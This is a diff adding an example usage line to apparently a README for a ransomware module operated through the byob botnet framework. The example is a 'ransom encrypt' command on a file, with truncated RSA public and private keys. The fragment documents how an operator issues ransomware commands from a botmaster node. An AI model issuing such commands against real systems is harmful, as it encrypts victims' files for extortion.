@@ -128,6 +128,11 @@ We are using the keys generated from CryptoTools [https://cryptotools.net/rsagen
 
 Let us call the keys _pub_ & _priv_ for our case. 
 
+A command should look like this
+```
+ransom encrypt test.txt MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...IDAQAB MIIEpQIBAAKCAQEAwr6x1f8XRzzi8Gvx8Uxys8Q/...+kCUsXHpgh8oE=
+```
+
 #### Entering ransom commands through byob
 On botmaster node where the server is running, type the command:
 
